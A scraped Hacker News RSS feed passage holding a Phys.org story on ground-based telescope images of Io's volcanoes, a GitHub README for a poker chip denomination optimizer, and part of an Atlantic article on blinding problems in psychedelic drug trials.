<div data-thumb="https://scx1.b-cdn.net/csz/news/tmb/2024/glimpses-of-a-volcanic.jpg" data-src="https://scx2.b-cdn.net/gfx/news/hires/2024/glimpses-of-a-volcanic.jpg" data-sub-html="The UArizona-managed Large Binocular Telescope on Mount Graham is the only one of its kind, with two 27-foot mirrors mounted side by side. A powerful adaptive optics system compensates for blurring introduced by atmospheric turbulence, making it one of the most powerful Earth-based observatories in the world. Credit: NASA">
        <figure>
            <img src="https://scx1.b-cdn.net/csz/news/800a/2024/glimpses-of-a-volcanic.jpg" alt="Glimpses of a volcanic world: New telescope images of Jupiter's moon Io rival those from spacecraft" title="The UArizona-managed Large Binocular Telescope on Mount Graham is the only one of its kind, with two 27-foot mirrors mounted side by side. A powerful adaptive optics system compensates for blurring introduced by atmospheric turbulence, making it one of the most powerful Earth-based observatories in the world. Credit: NASA" width="800" height="530">
             <figcaption>
                The UArizona-managed Large Binocular Telescope on Mount Graham is the only one of its kind, with two 27-foot mirrors mounted side by side. A powerful adaptive optics system compensates for blurring introduced by atmospheric turbulence, making it one of the most powerful Earth-based observatories in the world. Credit: NASA
            </figcaption>        </figure>
    </div><p>New images of Jupiter's volcano-studded moon Io, taken by the Large Binocular Telescope on Mount Graham in Arizona, offer the highest resolution of Io ever achieved with an Earth-based instrument. The observations were made possible by a new high-contrast optical imaging instrument, dubbed SHARK-VIS, and the telescope's adaptive optics system, which compensates for the blurring induced by atmospheric turbulence.</p>


										      
																																	<p>The images, to be published in the journal <i>Geophysical Research Letters</i>, reveal surface features as small as 50 miles across, a spatial resolution that until now had been achievable only with spacecraft sent to Jupiter. This is equivalent to taking a picture of a dime-sized object from 100 miles away, according to the research team.</p>
<p>SHARK-VIS allowed the researchers to identify a major resurfacing event around Pele, one of Io's most prominent volcanoes. According to the paper's first author, Al Conrad, the eruptions on Io, the most volcanically active body in the solar system, dwarf their contemporaries on Earth.</p>
<p>"Io, therefore, presents a unique opportunity to learn about the mighty eruptions that helped shape the surfaces of the Earth and the moon in their distant pasts," said Conrad, associate staff scientist at the Large Binocular Telescope Observatory. The Large Binocular Telescope, or LBT, is part of Mount Graham International Observatory, a division of the University of Arizona Steward Observatory.</p>
<p>Conrad added that studies like this one will help researchers understand why some worlds in the solar system are volcanic but not others. They also may someday shed light on volcanic worlds in exoplanet systems around nearby stars.</p>
<p>Slightly larger than Earth's moon, Io is the innermost of Jupiter's Galilean moons, which in addition to Io, include Europa, Ganymede and Callisto. Locked in a gravitational "tug of war" among Jupiter, Europa and Ganymede, Io is constantly being squeezed, leading to frictional heat buildup in its interior—believed to be the cause for its sustained and widespread volcanic activity.</p>

																																						
																																			<p>By monitoring the eruptions on Io's surface, scientists hope to gain insights into the heat-driven movement of material underneath the moon's surface, its internal structure and ultimately, on the tidal heating mechanism responsible for Io's intense volcanism.</p>
<p>Io's volcanic activity was first discovered in 1979, when Linda Morabito, an engineer on NASA's Voyager mission, spotted an eruption plume in one of the images taken by the spacecraft during its famous "Grand Tour" of the outer planets. Since then, countless observations have been made that document Io's restless nature, from both space and Earth-based telescopes.</p>

<div data-thumb="https://scx1.b-cdn.net/csz/news/tmb/2024/glimpses-of-a-volcanic-1.jpg" data-src="https://scx2.b-cdn.net/gfx/news/hires/2024/glimpses-of-a-volcanic-1.jpg" data-sub-html="Jupiter moon Io, imaged by SHARK-VIS on Jan. 10, 2024. This is the highest resolution image of Io ever obtained by an Earth-based telescope. The image combines three spectral bands — infrared, red and yellow — to highlight the reddish ring around the volcano Pele (below and to the right of the moon's center) and the white ring around Pillan Patera, to the right of Pele. Credit: INAF/Large Binocular Telescope Observatory/Georgia State University; IRV-band observations by SHARK-VIS/F. Pedichini; processing by D. Hope, S. Jefferies, G. Li Causi">
        <figure>
            <img src="https://scx1.b-cdn.net/csz/news/800a/2024/glimpses-of-a-volcanic-1.jpg" alt="Glimpses of a volcanic world: New telescope images of Jupiter's moon Io rival those from spacecraft" title="Jupiter moon Io, imaged by SHARK-VIS on Jan. 10, 2024. This is the highest resolution image of Io ever obtained by an Earth-based telescope. The image combines three spectral bands — infrared, red and yellow — to highlight the reddish ring around the volcano Pele (below and to the right of the moon's center) and the white ring around Pillan Patera, to the right of Pele. Credit: INAF/Large Binocular Telescope Observatory/Georgia State University; IRV-band observations by SHARK-VIS/F. Pedichini; processing by D. Hope, S. Jefferies, G. Li Causi">
             <figcaption>
                Jupiter moon Io, imaged by SHARK-VIS on Jan. 10, 2024. This is the highest resolution image of Io ever obtained by an Earth-based telescope. The image combines three spectral bands — infrared, red and yellow — to highlight the reddish ring around the volcano Pele (below and to the right of the moon's center) and the white ring around Pillan Patera, to the right of Pele. Credit: INAF/Large Binocular Telescope Observatory/Georgia State University; IRV-band observations by SHARK-VIS/F. Pedichini; processing by D. Hope, S. Jefferies, G. Li Causi
            </figcaption>        </figure>
    </div>
<p>Study co-author Ashley Davies, a principal scientist at NASA's Jet Propulsion Laboratory, said the new image taken by SHARK-VIS is so rich in detail that it has allowed the team to identify a major resurfacing event in which the plume deposit around a prominent volcano known as Pele, located in Io's southern hemisphere close to the equator, is being covered by eruption deposits from Pillan Patera, a neighboring volcano. A similar eruption sequence was observed by NASA's Galileo spacecraft, which explored the Jupiter system between 1995 and 2003.</p>
<p>"We interpret the changes as dark lava deposits and white sulfur dioxide deposits originating from an eruption at Pillan Patera, which partially cover Pele's red, sulfur-rich plume deposit," Davies said. "Before SHARK-VIS, such resurfacing events were impossible to observe from Earth."</p>

																																			<p>While telescope images in the infrared can detect hot spots caused by ongoing volcanic eruptions, they are not sharp enough to reveal surface details and unambiguously identify the locations of the eruptions, explained co-author Imke de Pater, professor emerita of astronomy at the University of California—Berkeley.</p>
<p>"Sharper images at <a href="https://phys.org/tags/visible+wavelengths/" rel="tag">visible wavelengths</a> like those provided by SHARK-VIS and LBT are essential to identify both locations of <a href="https://phys.org/tags/eruptions/" rel="tag">eruptions</a> and surface changes not detectable in the infrared, such as new plume deposits," de Pater said, adding that visible light observations provide researchers with vital context for the interpretation of infrared observations, including those from spacecraft such as Juno, which is currently orbiting Jupiter.</p>
<p>SHARK-VIS was built by the Italian National Institute for Astrophysics at the Rome Astronomical Observatory and is managed by a team led by principal investigator Fernando Pedichini, assisted by project manager Roberto Piazzesi.</p>
<p>In 2023, it was installed, together with its complementary near-infrared instrument SHARK-NIR, at the LBT to fully take advantage of the telescope's outstanding adaptive optics system. The instrument houses a fast, ultra-low-noise camera that allows it to observe the sky in "fast imaging" mode, capturing slow-motion footage that freezes the optical distortions caused by atmospheric turbulence, and to post-process data to an unprecedented sharpness.</p>

																																						
																																			<p>Gianluca Li Causi, data processing manager for SHARK-VIS at the Italian National Institute for Astrophysics, explained, "We process our data on the computer to remove any trace of the sensor's electronic footprint. We then select the best frames and combine them using a highly efficient software package called Kraken, developed by our colleagues Douglas Hope and Stuart Jefferies from Georgia State University. Kraken allows us to remove atmospheric effects, revealing Io in incredible sharpness."</p>
<p>SHARK-VIS instrument scientist Simone Antoniucci said he anticipates new observations to be made of objects throughout the solar system.</p>
<p>"The keen vision of SHARK-VIS is particularly suited to observing the surfaces of many solar system bodies, not only the moons of giant planets but also asteroids," he said. "We have already observed some of those, with the data currently being analyzed, and are planning to observe more."</p>

																																																					
																				<div>
																						<p><strong>More information:</strong>
												Observation of Io's Resurfacing via Plume Deposition Using Ground-based Adaptive Optics at Visible Wavelengths with LBT SHARK-VIS, <i>Geophysical Research Letters</i> (2024). <a data-doi="1" href="https://dx.doi.org/10.1029/2024GL108609" target="_blank">DOI: 10.1029/2024GL108609</a>. On <i>arXiv</i>: <a href="https://arxiv.org/abs/2405.19604" target="_blank">arxiv.org/abs/2405.19604</a>
																						
																						</p>
																					</div>
                               											
																					
                              										                                        
										<!-- print only -->
										<div>
											 <p><strong>Citation</strong>:
												Glimpses of a volcanic world: New telescope images of Jupiter's moon Io rival those from spacecraft (2024, May 31)
												retrieved 4 June 2024
												from https://phys.org/news/2024-05-glimpses-volcanic-world-telescope-images.html
											 </p>
											 <p>
											 This document is subject to copyright. Apart from any fair dealing for the purpose of private study or research, no
											 part may be reproduced without the written permission. The content is provided for information purposes only.
											 </p>
										</div>
                                        
									</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Diffusion on Syntax Trees for Program Synthesis (361 pts)]]></title>
            <link>https://tree-diffusion.github.io/</link>
            <guid>40569531</guid>
            <pubDate>Tue, 04 Jun 2024 00:52:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://tree-diffusion.github.io/">https://tree-diffusion.github.io/</a>, See on <a href="https://news.ycombinator.com/item?id=40569531">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Allocate poker chips optimally with mixed-integer nonlinear programming (109 pts)]]></title>
            <link>https://github.com/jstrieb/poker-chipper</link>
            <guid>40569385</guid>
            <pubDate>Tue, 04 Jun 2024 00:29:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/jstrieb/poker-chipper">https://github.com/jstrieb/poker-chipper</a>, See on <a href="https://news.ycombinator.com/item?id=40569385">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><div dir="auto"><h2 tabindex="-1" dir="auto">
<p dir="auto"><a href="https://jstrieb.github.io/poker-chipper" rel="nofollow"><img src="https://github.com/jstrieb/poker-chipper/raw/master/public/favicon.svg?raw=true" width="125" height="125"></a></p>
<p dir="auto">Poker Chipper</p>
</h2><a id="user-content-poker-chipper" aria-label="Permalink: Poker Chipper" href="#poker-chipper"></a></div>
<p dir="auto"><a href="https://jstrieb.github.io/poker-chipper" rel="nofollow">Optimally
select poker chip denominations for cash games using constrained, nonlinear
optimization.</a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">About</h2><a id="user-content-about" aria-label="Permalink: About" href="#about"></a></p>
<p dir="auto">Imagine hosting a small poker game. You know how many friends will attend, how
many chips you have, and the buy in. How do you pick chip denominations?</p>
<p dir="auto">Without Poker Chipper, picking chip denominations is manual and error-prone.
You first try to pick values that divide each other nicely and are easy to
remember. (Alternatively, struggle to recall the values from the last time you
played.) You next try to find a way to make the chosen values sum to the buy
in. Then, you backtrack whenever there aren't enough chips for everyone, or
when there are too many chips left over. Finally, you settle for a suboptimal
chip allocation so that you can actually start playing.</p>
<p dir="auto">With Poker Chipper, on the other hand, picking chip denominations is fast and
easy. Input the number of players, buy in, blinds, and number of chips. After
waiting a moment for the mathematically optimal results, you can save them for
next time, or share them with others. If you want to modify the results, adjust
the "advanced options," and the chip denominations will be recomputed
accordingly.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">How Poker Chipper Works</h2><a id="user-content-how-poker-chipper-works" aria-label="Permalink: How Poker Chipper Works" href="#how-poker-chipper-works"></a></p>
<p dir="auto">Poker Chipper uses mixed-integer nonlinear programming (MINLP), which is a form
of constrained, nonconvex optimization, to optimally pick poker chip
denominations.</p>
<p dir="auto">Optimization is performed using a "solver" – in this case,
<a href="https://www.scipopt.org/" rel="nofollow">SCIP</a>. Some inputs to Poker Chipper are translated
into solver constraints, which affect what denominations are admissible. Other
inputs influence the solver's objective function, which affects how candidate
denominations are evaluated, ranked, and chosen. In the user interface, inputs
affecting constraints, and inputs affecting the objective function are
described as influencing the "requirements" and "score," respectively, of
candidate solutions.</p>
<p dir="auto">Poker Chipper is a fully static web application. In other words, all of the
processing involved in performing optimization occurs client-side – entirely in
the user's browser. The SCIP solver is designed to run natively, so Poker
Chipper bundles it for the browser by compiling SCIP to WebAssembly (WASM) with
<a href="https://emscripten.org/" rel="nofollow">Emscripten</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">How to Read the Code</h2><a id="user-content-how-to-read-the-code" aria-label="Permalink: How to Read the Code" href="#how-to-read-the-code"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Code Table of Contents</h3><a id="user-content-code-table-of-contents" aria-label="Permalink: Code Table of Contents" href="#code-table-of-contents"></a></p>
<p dir="auto">The links below are listed in the order the code should be read to understand
the application from the highest to lowest level.</p>
<ul dir="auto">
<li><a href="https://github.com/jstrieb/poker-chipper/blob/master/src/App.svelte"><code>src/App.svelte</code></a> – main high-level application</li>
<li><a href="https://github.com/jstrieb/poker-chipper/blob/master/src"><code>src/*.svelte</code></a> – UI components</li>
<li><a href="https://github.com/jstrieb/poker-chipper/blob/master/src/solve.js"><code>src/solve.js</code></a> – convert user inputs to MINLP model and solve
using WASM SCIP</li>
<li><a href="https://github.com/jstrieb/poker-chipper/blob/master/src/solveWorker.js"><code>src/solveWorker.js</code></a> – web worker to run solver in
non-blocking thread</li>
<li><a href="https://github.com/jstrieb/poker-chipper/blob/master/public/serviceWorker.js"><code>public/serviceWorker.js</code></a> – service worker for
caching and offline functionality</li>
<li><a href="https://github.com/jstrieb/poker-chipper/blob/master/public"><code>public/*</code></a> – PWA manifest, global stylesheet, favicons, etc.</li>
<li><a href="https://github.com/jstrieb/poker-chipper/blob/master/experiments"><code>experiments/*</code></a> – exploration of initial concept in Python
(with both Z3, and later, SCIP), and Dockerfile for compiling SCIP with
Emscripten</li>
<li><a href="https://github.com/jstrieb/poker-chipper/blob/master/src/compiled"><code>src/compiled/*</code></a> – SCIP compiled to WASM via Emscripten,
plus associated support files</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Application Architecture</h3><a id="user-content-application-architecture" aria-label="Permalink: Application Architecture" href="#application-architecture"></a></p>
<p dir="auto">In the diagram below, labeled arrows represent asynchronous fetch requests and
message passing.</p>
<section data-identity="9cbda2e5-1521-4775-afe6-9c3f6eab7f75" data-host="https://viewscreen.githubusercontent.com" data-src="https://viewscreen.githubusercontent.com/markdown/mermaid?docs_host=https%3A%2F%2Fdocs.github.com" data-type="mermaid" aria-label="mermaid rendered output container">
  <div dir="auto" data-json="{&quot;data&quot;:&quot;flowchart LR\n    A[Svelte Front End] --&amp;gt;|Solve Requests| B[\&quot;Web Worker\n    (non-blocking thread)\&quot;]\n    B --&amp;gt;|Solutions| A\n    A &amp;lt;--&amp;gt;|Static Assets| C[Service Worker]\n    B &amp;lt;--&amp;gt;|Solver Static Assets| C\n    C --&amp;gt;|Cache| C\n    C &amp;lt;--&amp;gt;|Static Assets| D[Web Server]\n&quot;}" data-plain="flowchart LR
    A[Svelte Front End] -->|Solve Requests| B[&quot;Web Worker
    (non-blocking thread)&quot;]
    B -->|Solutions| A
    A <-->|Static Assets| C[Service Worker]
    B <-->|Solver Static Assets| C
    C -->|Cache| C
    C <-->|Static Assets| D[Web Server]
">
      <pre lang="mermaid" aria-label="Raw mermaid code">flowchart LR
    A[Svelte Front End] --&gt;|Solve Requests| B["Web Worker
    (non-blocking thread)"]
    B --&gt;|Solutions| A
    A &lt;--&gt;|Static Assets| C[Service Worker]
    B &lt;--&gt;|Solver Static Assets| C
    C --&gt;|Cache| C
    C &lt;--&gt;|Static Assets| D[Web Server]
</pre>
    </div>
  <span role="presentation">
    <svg style="box-sizing: content-box; color: var(--color-icon-primary);" width="16" height="16" viewBox="0 0 16 16" fill="none" data-view-component="true">
  <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none"></circle>
  <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke"></path>
</svg>
  </span>
</section>

<p dir="auto"><h2 tabindex="-1" dir="auto">Project Status &amp; Contributing</h2><a id="user-content-project-status--contributing" aria-label="Permalink: Project Status &amp; Contributing" href="#project-status--contributing"></a></p>
<p dir="auto">Poker Chipper is actively maintained. If there are no recent commits,
everything is running smoothly! As of the initial release, the code is stable,
and there are no major, outstanding features that remain to be added.</p>
<p dir="auto">Bug reports and feature requests via GitHub Issues are encouraged. Pull
requests with more than 20 lines of code are unlikely to be merged quickly,
unless associated with prior discussion or accompanied by substantial,
explanatory English prose. In other words, pull requests containing code
without context may be merged after much delay, or may not be merged at all.</p>
<p dir="auto">Since Poker Chipper is a fully static web application with no server-side
processing (outside of serving unchanging files), it is extremely scalable, and
has a very low maintenance burden. As such, even if something were to happen to
me, and I could not continue to work on the project, the <a href="https://jstrieb.github.io/poker-chipper/" rel="nofollow">public
version</a> should continue to remain
functional and available online as long as my GitHub account is open and the
<a href="https://jstrieb.github.io/" rel="nofollow">jstrieb.github.io</a> domain is active.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Support the Project</h2><a id="user-content-support-the-project" aria-label="Permalink: Support the Project" href="#support-the-project"></a></p>
<p dir="auto">The best ways to support the project are to:</p>
<ul dir="auto">
<li>Share the project on sites like Twitter, Reddit, and Hacker News</li>
<li>Report any bugs, glitches, errors, or shortcomings that you find</li>
<li>Star the repository and follow me on GitHub</li>
<li>Host a version of the code translated into another language</li>
</ul>
<p dir="auto">If you insist on spending money to show your support, please do so in a way
that is widely beneficial. In particular, donations to the following
organizations help me, in addition to the general, Internet-using public:</p>
<ul dir="auto">
<li><a href="https://supporters.eff.org/donate/" rel="nofollow">Electronic Frontier Foundation</a></li>
<li><a href="https://archive.org/donate/index.php" rel="nofollow">The Internet Archive</a></li>
<li><a href="https://signal.org/donate/" rel="nofollow">Signal Foundation</a></li>
<li><a href="https://donate.mozilla.org/en-US/" rel="nofollow">Mozilla</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Acknowledgments &amp; Greetz</h2><a id="user-content-acknowledgments--greetz" aria-label="Permalink: Acknowledgments &amp; Greetz" href="#acknowledgments--greetz"></a></p>
<p dir="auto">Poker Chipper would not have been possible without help and feedback from:</p>
<ul dir="auto">
<li><a href="https://github.com/lsnow99">Logan Snow</a></li>
<li><a href="https://www.linkedin.com/in/amyjl" rel="nofollow">Amy Liu</a></li>
<li><a href="https://twitter.com/chrischerian" rel="nofollow">Chris Cherian</a></li>
<li><a href="https://www.linkedin.com/in/ani-chowdhury" rel="nofollow">Ani Chowdhury</a></li>
<li>Will Hooper</li>
</ul>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Psychedelics are challenging the standard of randomized controlled trials (118 pts)]]></title>
            <link>https://www.theatlantic.com/health/archive/2024/06/psychedelics-mdma-ptsd-fda-placebo/678588/</link>
            <guid>40568515</guid>
            <pubDate>Mon, 03 Jun 2024 22:45:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theatlantic.com/health/archive/2024/06/psychedelics-mdma-ptsd-fda-placebo/678588/">https://www.theatlantic.com/health/archive/2024/06/psychedelics-mdma-ptsd-fda-placebo/678588/</a>, See on <a href="https://news.ycombinator.com/item?id=40568515">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><header data-event-module="hero"><div><div><p>How do you study mind-altering drugs when every clinical-trial participant knows they’re tripping?</p></div><div><figure><div data-flatplan-lead_figure_media="true"><picture><img alt="Psychedelic neon-blue-and=pink image of test tubes, sample containers, a clipboard, and a pen being sucked into a vortex" sizes="(min-width: 976px) 976px, 100vw" srcset="https://cdn.theatlantic.com/thumbor/chwH8rwkHlh5tjhWGZ5wZRE4RqA=/0x0:2000x1125/750x422/media/img/mt/2024/06/RCT/original.jpg 750w, https://cdn.theatlantic.com/thumbor/69WJ7GKWx2HEdbEguEojtZCy8PU=/0x0:2000x1125/828x466/media/img/mt/2024/06/RCT/original.jpg 828w, https://cdn.theatlantic.com/thumbor/dTZwxQdR0py24vu2XqE7ZQ0bOxg=/0x0:2000x1125/960x540/media/img/mt/2024/06/RCT/original.jpg 960w, https://cdn.theatlantic.com/thumbor/94gN6tSPm3USLm6YrRA50pb7KHg=/0x0:2000x1125/976x549/media/img/mt/2024/06/RCT/original.jpg 976w, https://cdn.theatlantic.com/thumbor/8NA2ueGeJDZktq6p30Ch5R4lLbY=/0x0:2000x1125/1952x1098/media/img/mt/2024/06/RCT/original.jpg 1952w" src="https://cdn.theatlantic.com/thumbor/dTZwxQdR0py24vu2XqE7ZQ0bOxg=/0x0:2000x1125/960x540/media/img/mt/2024/06/RCT/original.jpg" id="article-lead-image" width="960" height="540"></picture></div><figcaption data-flatplan-lead_figure_caption="true">Illustration by Matteo Giuseppe Pani. Source: Getty.</figcaption></figure></div></div><gpt-ad format="injector" sizes-at-0="mobile-wide" targeting-pos="injector-article-start" sizes-at-976="desktop-wide"></gpt-ad></header><section data-event-module="article body" data-flatplan-body="true"><p data-flatplan-paragraph="true">Tomorrow, a Food and Drug Administration advisory committee will meet to discuss whether the United States should approve its first psychedelic drug. The fate of the treatment—MDMA-assisted therapy for post-traumatic stress disorder—will turn on how the FDA interprets data from two <a data-event-element="inline link" href="https://www.nature.com/articles/s41591-021-01336-3">clinical trials</a> that, on their face, are promising. Long-suffering patients who took the drug while undergoing intensive talk therapy were <a data-event-element="inline link" href="https://www.nature.com/articles/s41591-023-02565-4">about twice as likely</a> to recover from PTSD as patients who got the placebo with therapy.</p><p data-flatplan-paragraph="true">If the treatment is approved this summer, it could bring relief to some of the approximately 13 million Americans with PTSD. It could also serve as a model for other psychedelics to meet the FDA’s regulatory bar. But there’s a conundrum at the core of these two clinical trials, one that has plagued virtually all efforts to study psychedelics.</p><p data-flatplan-paragraph="true">In clinical trials, participants (and the researchers studying them) generally aren’t supposed to know whether they’re getting the actual drug or a placebo, to avoid allowing people’s expectations about a treatment to shape their response to it. Blinding, as this practice is called, is a key component of a randomized controlled clinical trial, or RCT—medicine’s gold standard for demonstrating that a drug actually works. But virtually no one can take a psychedelic drug and not know it.</p><p data-flatplan-paragraph="true">Some experts believe that unblinding threatens to undermine the entire field of psychedelic research because it means researchers can’t know whether the drugs’ early promise in clinical trials is real or a mirage, driven by the placebo effect and outsize expectations about the power of these drugs. But others argue that RCTs themselves are at fault. To them, psychedelics are exposing long-ignored cracks in our gold standard, especially for testing drugs that act on our minds.</p><p id="injected-recirculation-link-0" data-view-action="view link - injected link - item 1" data-event-element="injected link" data-event-position="1"><a href="https://www.theatlantic.com/science/archive/2018/06/what-its-like-to-trip-on-the-most-potent-magic-mushroom/561860/">Read: What it’s like to trip on the most potent magic mushroom</a></p><p data-flatplan-paragraph="true">When randomized controlled trials are well designed, “there is no substitute,” Boris Heifets, a neuroscientist at Stanford University, told me. In an RCT, participants get randomly sorted into two groups, receiving either the treatment or a placebo. Scientists have prized such trials since the 1960s for their power to rule out all the nondrug reasons people who are given a new medication might get better. Chief among those reasons is the placebo effect, in which a patient’s belief in a treatment, rather than anything about the drug or procedure itself, leads to improvement. If trial participants come in with sky-high expectations (as experts suspect is the case in many psychedelics trials), knowing that they’ve received a drug could fuel positive responses, and learning they’ve been denied it could cause them to react negatively. “We’ve gotten a ton of things <a data-event-element="inline link" href="https://www.theatlantic.com/health/archive/2017/11/placebo-effect-of-the-heart/545012/">wrong</a> by trusting unblinded results,” says David Rind, the chief medical officer of the Institute for Clinical and Economic Review, a nonprofit that evaluates new medical treatments.</p><p data-flatplan-paragraph="true">For all of RCTs’ advantages, “I think it’s obvious that they’re not well suited for studying psychedelics,” Heifets said. In cancer-drug trials, participants won’t know the difference between a saline IV drip and medicine; to test new surgical procedures, control groups sometimes get cut into and sewed up without the actual treatment. But psychedelics like psilocybin or LSD launch people into hallucinatory states that bend space and time. MDMA, known to many as ecstasy, is less extreme, but still sparks expansive feelings of love and empathy. “Participants will know within half an hour whether they’ve been assigned to the experimental or placebo condition,” Michiel van Elk, a cognitive psychologist at Leiden University, told me. In the MDMA clinical trials, run by the pharmaceutical company Lykos Therapeutics, nearly all participants correctly guessed which group they were in.</p><p data-flatplan-paragraph="true">Many scientists want to get around this problem by designing better blinds. Some labs have tried to keep patients in the dark by administering drugs <a data-event-element="inline link" href="https://www.nature.com/articles/s44220-023-00140-x">under anesthesia</a> or using mind-altering pills like <a data-event-element="inline link" href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6879524/">methamphetamines</a> as a placebo. Others are trying to engineer new psychedelics that <a data-event-element="inline link" href="https://www.theatlantic.com/health/archive/2023/11/non-hallucinogenic-psychedelic-clinical-therapy/675942/">skip the trip entirely</a>. But to other scientists, clever attempts to stuff psychedelics into the RCT framework ignore the possibility that psychedelics’ benefits aren’t reducible to the biochemical action of the drug itself. Since the 1960s, psychedelic researchers have known that the beliefs and expectations a person brings to a trip can influence whether it’s healing or nightmarish. (That’s why most psychedelic-therapy protocols include several psychotherapy sessions before, during, and after treatment.) By striving to cleave the drug’s effects from the context in which it’s given—to a patient by a therapist, both of whom are hoping for healing—blinded studies may fail to capture the full picture.</p><p id="injected-recirculation-link-1" data-view-action="view link - injected link - item 2" data-event-element="injected link" data-event-position="2"><a href="https://www.theatlantic.com/health/archive/2023/02/psychedelic-drug-therapy-effects-brain-neuroplasticity/672910/">Read: Psychedelics open your brain. You might not like what falls in.</a></p><p data-flatplan-paragraph="true">From this perspective, high proportions of unblinding in positive psychedelic trials don’t necessarily mean that the results are invalid. “It’s how people engage with those effects and their therapist that’s contributing to the improvement,” Eduardo Schenberg, a neuroscientist at Instituto Phaneros, a nonprofit psychedelic-research center in Brazil, told me. Recent research backs this up. One small study found that among chronic PTSD patients who got MDMA-assisted therapy, the strength of the bond between therapist and patient—something the drug helps forge with its empathy-inducing effects—<a data-event-element="inline link" href="https://pubmed.ncbi.nlm.nih.gov/38174611/">predicted treatment success</a>. Given the importance of context, even the most perfectly designed RCTs may fail to capture how helpful these drugs are outside trials, Schenberg said.</p><p data-flatplan-paragraph="true">Such failure, if it exists, might extend beyond psychedelics to several kinds of psychoactive drugs. For instance, a <a data-event-element="inline link" href="https://pubmed.ncbi.nlm.nih.gov/34861421/">2022 analysis</a> found that many antidepressant trials fail to effectively blind participants, in part because of side effects. “We know that <a data-event-element="inline link" href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4172306/">80 percent</a> of the treatment response from antidepressants can be attributed to the placebo response,” Amelia Scott, a clinical psychologist at Macquarie University who co-wrote that study, told me. Yet in practice, antidepressants are effective for many people, suggesting that RCTs aren’t quite capturing what these drugs can offer—and that limiting ourselves to treatments that can be perfectly blinded could mean ignoring helpful mental-health interventions. “We shouldn’t be afraid to question the gold standard,” Schenberg told me. “For different kinds of diseases and treatments, we may need slightly different standards.”</p><p data-flatplan-paragraph="true">RCTs likely won’t lose their perch as the gold standard anytime soon, for evaluating psychedelics or anything else. But they could be supplemented with other kinds of studies that would broaden our understanding of how psychedelics work, Matt Butler, a neuroscientist at King’s College London, told me. Scientists are already trying open-label trials, where participants know which treatment they’re getting, and measuring expectations along with treatment effects. Descriptive studies, which <a data-event-element="inline link" href="https://akjournals.com/view/journals/2054/aop/article-10.1556-2054.2024.00369/article-10.1556-2054.2024.00369.xml">track how treatments are working</a> in actual clinics, could provide a richer picture of what therapeutic contexts work best. “These levels of evidence aren’t as good as RCTs,” Butler said, but they could help deepen our understanding of when therapies that don’t conform to RCTs could be most helpful.</p><p id="injected-recirculation-link-2" data-view-action="view link - injected link - item 3" data-event-element="injected link" data-event-position="3"><a href="https://www.theatlantic.com/health/archive/2023/11/non-hallucinogenic-psychedelic-clinical-therapy/675942/">Read: What if psychedelics’ hallucinations are just a side effect?</a></p><p data-flatplan-paragraph="true">None of this is to say that Lykos’s flawed RCT data will be enough to convince the FDA’s advisers that Americans with PTSD should be offered MDMA. Several groups, including the American Psychiatric Association, have <a data-event-element="inline link" href="https://www.regulations.gov/comment/FDA-2024-N-1938-0037">expressed concern</a> about the trials ahead of the advisory meeting. In addition to the unblinding issue, claims that therapists encouraged participants to report favorable results and hide adverse events prompted the Institute for Clinical and Economic Review to release a <a data-event-element="inline link" href="https://icer.org/news-insights/press-releases/institute-for-clinical-and-economic-review-publishes-evidence-report-on-treatment-for-post-traumatic-stress-disorder/">report casting doubt</a> on the studies. Lykos CEO Amy Emerson pushed back in a statement, saying, “We stand by the quality and integrity of our research and development program.” Still, some researchers remain worried. “If this sets a precedent that these trials are acceptable data, what does that mean for the future?” Suresh Muthukumaraswamy, a neuropharmacologist at the University of Auckland, told me.</p><p data-flatplan-paragraph="true">The recent past suggests that blinding may not be a deal-breaker for the FDA. In 2019, the agency approved <a data-event-element="inline link" href="https://www.fda.gov/news-events/press-announcements/fda-approves-new-nasal-spray-medication-treatment-resistant-depression-available-only-certified">Spravato esketamine nasal spray</a>—a version of ketamine—for the treatment of depression despite <a data-event-element="inline link" href="https://icer.org/wp-content/uploads/2020/10/ICER_TRD_Final_Evidence_Report_062019.pdf">concerns</a> about unblinding in the drug’s clinical trials. And the FDA <a data-event-element="inline link" href="https://maps.org/news/media/press-release-fda-grants-breakthrough-therapy-designation-for-mdma-assisted-psychotherapy-for-ptsd-agrees-on-special-protocol-assessment-for-phase-3-trials/">worked with Lykos</a> to design the MDMA-therapy trials after designating it a breakthrough treatment in 2017. In an email, an FDA spokesperson told me that blinded RCTs provide the most rigorous level of evidence, but “unblinded studies can still be considered adequate and well-controlled as long as there is a valid comparison with a control.” In such cases, the spokesperson said, regulators can take into account things like the size of the treatment effect in deciding whether the treatment performed significantly better than the placebo.</p><p id="injected-recirculation-link-3" data-view-action="view link - injected link - item 4" data-event-element="injected link" data-event-position="4"><a href="https://www.theatlantic.com/health/archive/2017/11/placebo-effect-of-the-heart/545012/">Read: Placebo effect of the heart</a></p><p data-flatplan-paragraph="true">Even if the FDA is on board, rolling out psychedelic therapies before scientists fully understand the interplay among expectation, therapy, and drugs could mean missing an opportunity to force companies to provide data that would meaningfully advance the study of these drugs, Muthukumaraswamy said. It also risks undermining these treatments in the long run. If sky-high expectations are ultimately fueling the positive results we see now, the FDA could end up approving a treatment that becomes less effective as its novelty wears off. That’s especially true if we’re missing key components of what makes these treatments work, or what puts people at risk for bad experiences. To better answer those questions—for psychedelics and other psychoactive drugs—we may need studies that go beyond the gold 